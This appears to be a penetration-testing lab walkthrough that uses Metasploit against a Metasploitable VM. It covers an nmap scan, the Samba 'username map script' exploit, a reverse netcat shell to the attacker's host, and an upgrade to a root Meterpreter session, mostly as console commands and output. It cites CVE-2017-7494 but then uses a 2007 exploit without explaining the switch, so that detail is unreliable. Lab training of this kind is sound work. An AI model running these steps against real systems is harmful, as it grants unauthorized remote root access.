## Scanning linux server using db_nmap command
```python
msf6 > db_nmap -sV -p- 192.168.216.4
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 15:32 IST
[*] Nmap: Nmap scan report for 192.168.216.4 (192.168.216.4)
[*] Nmap: Host is up (0.00045s latency).
[*] Nmap: Not shown: 65505 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE     VERSION
[*] Nmap: 21/tcp    open  ftp         vsftpd 2.3.4
[*] Nmap: 22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
[*] Nmap: 23/tcp    open  telnet      Linux telnetd
[*] Nmap: 25/tcp    open  smtp        Postfix smtpd
[*] Nmap: 53/tcp    open  domain      ISC BIND 9.4.2
[*] Nmap: 80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: 111/tcp   open  rpcbind     2 (RPC #100000)
[*] Nmap: 139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 512/tcp   open  exec?
[*] Nmap: 513/tcp   open  login       OpenBSD or Solaris rlogind
[*] Nmap: 514/tcp   open  tcpwrapped
[*] Nmap: 1099/tcp  open  java-rmi    GNU Classpath grmiregistry
[*] Nmap: 1524/tcp  open  bindshell   Metasploitable root shell
[*] Nmap: 2049/tcp  open  nfs         2-4 (RPC #100003)
[*] Nmap: 2121/tcp  open  ftp         ProFTPD 1.3.1
[*] Nmap: 3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: 3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
[*] Nmap: 5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
[*] Nmap: 5900/tcp  open  vnc         VNC (protocol 3.3)
[*] Nmap: 6000/tcp  open  X11         (access denied)
[*] Nmap: 6667/tcp  open  irc         UnrealIRCd
[*] Nmap: 6697/tcp  open  irc         UnrealIRCd
[*] Nmap: 8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
[*] Nmap: 8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: 8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
[*] Nmap: 35918/tcp open  java-rmi    GNU Classpath grmiregistry
[*] Nmap: 43158/tcp open  mountd      1-3 (RPC #100005)
[*] Nmap: 51510/tcp open  nlockmgr    1-4 (RPC #100021)
[*] Nmap: 53610/tcp open  status      1 (RPC #100024)
[*] Nmap: MAC Address: 08:00:27:EC:47:BA (Oracle VirtualBox virtual NIC)
[*] Nmap: Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 131.05 seconds

```

## List out the particular services which we know by scanning just before:
```python
msf6 > services -c port,info -p 139,445 192.168.216.4
Services
========

host           port  info
----           ----  ----
192.168.216.4  139   Samba smbd 3.X - 4.X workgroup: WORKGROUP
192.168.216.4  445   Samba smbd 3.X - 4.X workgroup: WORKGROUP
```
- Now we are exploiting the vulnerability which have open port on port 139 and we have to find the CVE related to the service which is running on this port.
- Here is a Common Vulnerabilities and Exposures (CVE) related to the Samba smbd 3.X - 4.X workgroup with port 139:
	- CVE-2017-7494: This vulnerability, also known as "SambaCry," is a remote code execution vulnerability in Samba versions 3.5.0 to 4.6.4 that allows an attacker to upload a shared library to a writable share and then cause the server to execute the library. This vulnerability can be exploited over port 139, which is the port used by the Server Message Block (SMB) protocol for file and printer sharing. This vulnerability was first discovered and publicly disclosed in May 2017, and patches were released shortly thereafter.

## Now that we know the version of the Samba daemon running, we can search for vulnerabilities and then use the search command to search for available exploits.
```python
msf6 > search cve:2007 type:exploit samba

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
   1  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   2  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   3  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
```

## To select the exploit, employ the use command followed by the exploit name:
```python
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```

## Now that we have selected the exploit, we can get more information about it by running the info command:
```python
msf6 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14
-------------------------SNIP----------------------------------
```
- Note - The info command with the -f option shows the information in a markdown version with a browser.

## Using the show missing command, we can see what values we need to fill in to use the exploit:
```python
msf6 exploit(multi/samba/usermap_script) > show missing

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
                                      t.html


Payload options (cmd/unix/reverse_netcat):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------```
- Note - To show the module's advanced options, you can use the show advanced command.

## As expected, to run the exploit we need to specify the IP address of the target, so we will use the set command to specify the RHOST value, and use the exploit command to exploit the target:
```python
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.216.4
RHOSTS => 192.168.216.4
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] Command shell session 1 opened (192.168.216.9:4444 -> 192.168.216.4:35973) at 2023-03-08 15:49:40 +0530

hostname
metasploitable```
- Upon successful execution of the exploit, we will be provided with shell connectivity with our target machine.
- To verify that we actually have access, we can type some Linux commands, such as the hostname command, to display the name of the machine, and to background the session we use Ctrl + Z.
## To manipulate sessions, we use the sessions command:
```python
msf exploit(usermap_script) > sessions -h
```

## To go back to the session, we use the sessions command followed by the -i option and the session ID; to abort the session we use Ctrl + C:
```python
msf6 exploit(multi/samba/usermap_script) > sessions -i 2
[*] Starting interaction with 2...

hostname
metasploitable
^C
Abort session 2? [y/N]  y

[*] 192.168.216.4 - Command shell session 2 closed.  Reason: User exit
```

## How it works...
- Samba is used for printers and file sharing between Linux and Windows machines.
- No authentication is needed to exploit this vulnerability.

## What about the payload?
- Since we didn't specify a payload, metasploit did that for us; it selected a Unix reverse TCP shell, filled in the listen address with our Kali Linux IP address, and used the default listen port 4444.
#### To display this information, we can use the show options command:
```python
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.216.4    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
                                      t.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.216.9    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

#### To list all the available payloads, we use the show payloads command:
```python
msf6 exploit(multi/samba/usermap_script) > show payloads
```

## upgrading shell to a meterpreter session using "-u" option:
```python
msf6 exploit(multi/samba/usermap_script) > sessions -u 3
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.216.9:4433 
[*] Sending stage (1017704 bytes) to 192.168.216.4
[*] Command stager progress: 100.00% (773/773 bytes)
```

## By running the sessions command again, we can see that we now have two sessions:
```python
msf6 exploit(multi/samba/usermap_script) > sessions

Active sessions
===============

  Id  Name  Type                   Information                        Connection
  --  ----  ----                   -----------                        ----------
  3         shell cmd/unix                                            192.168.216.9:4444 -> 192.168.216.4:40606 (192.168.216.4)
  4         meterpreter x86/linux  root @ metasploitable.localdomain  192.168.216.9:4433 -> 192.168.216.4:37059 (192.168.216.4)
```

